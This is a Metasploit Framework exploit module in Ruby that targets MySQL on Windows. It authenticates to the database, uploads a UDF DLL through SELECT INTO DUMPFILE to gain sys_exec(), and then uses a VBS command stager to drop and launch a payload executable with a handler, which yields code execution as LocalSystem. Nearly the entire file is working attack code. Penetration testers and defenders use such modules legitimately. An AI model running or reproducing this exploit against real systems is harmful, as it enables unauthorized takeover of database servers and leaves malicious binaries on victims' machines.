##
# $Id: mysql_payload.rb 11899 2011-03-08 22:42:26Z todb $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::MYSQL
	include Msf::Exploit::CmdStagerVBS

	def initialize(info = {})
		super(
			update_info(
				info,
			'Name'           => 'Oracle MySQL for Microsoft Windows Payload Execution',
			'Description'    => %q{
				This module creates and enables a custom UDF (user defined function) on the
				target host via the SELECT ... into DUMPFILE method of binary injection. On
				default Microsoft Windows installations of MySQL (=< 5.5.9), directory write
				permissions not enforced, and the MySQL service runs as LocalSystem.

				NOTE: This module will leave a payload executable on the target system when the
				attack is finished, as well as the UDF DLL, and will define or redefine sys_eval()
				and sys_exec() functions.
			},
		'Author'         =>
		[
			'Bernardo Damele A. G. <bernardo.damele[at]gmail.com>', # the lib_mysqludf_sys.dll binaries
			'todb' # this Metasploit module
		],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 11899 $',
			'References'     =>
		[
			# Bernardo's work with cmd exec via udf
			[ 'URL', 'http://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html' ],
			# Advice from 2005 on securing MySQL on Windows, kind of helpful.
			[ 'URL', 'http://dev.mysql.com/tech-resources/articles/securing_mysql_windows.html' ]
		],
			'Platform'       => 'win',
			'Targets'        =>
		[
			[ 'Automatic', { } ], # Confirmed on MySQL 4.1.22, 5.5.9, and 5.1.56 (64bit)
		],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jan 16 2009' # Date of Bernardo's blog post.
		))
		register_options(
			[
				OptBool.new('VERBOSE', [ false, 'Enable verbose output', false ]),
				OptBool.new('FORCE_UDF_UPLOAD', [ false, 'Always attempt to install a sys_exec() mysql.function.', false ]),
				OptString.new('USERNAME', [ false, 'The username to authenticate as', 'root' ])
		])
	end

	def username
		datastore['USERNAME']
	end

	def password
		datastore['PASSWORD']
	end

	def login_and_get_sys_exec
		mysql_login(username,password,'mysql')
		@mysql_arch = mysql_get_arch
		@mysql_sys_exec_available = mysql_check_for_sys_exec() 
		if !@mysql_sys_exec_available || datastore['FORCE_UDF_UPLOAD']
			mysql_add_sys_exec 
			@mysql_sys_exec_available = mysql_check_for_sys_exec() 
		else
			print_status "sys_exec() already available, using that (override with FORCE_UDF_UPLOAD)."
		end
	end

	def execute_command(cmd, opts)
		mysql_sys_exec(cmd, datastore['VERBOSE'])
	end

	def exploit
		login_and_get_sys_exec()

		if not @mysql_handle
			print_status("Invalid MySQL credentials")
			return
		elsif not [:win32,:win64].include?(@mysql_arch) 
			print_status("Incompatible MySQL target architecture: '#{@mysql_arch}'")
			return
		else
			if @mysql_sys_exec_available
				execute_cmdstager({:linemax => 1500, :nodelete => true})
				handler
			else
				print_status("MySQL function sys_exec() not available")
				return
			end
		end
		disconnect
	end

end
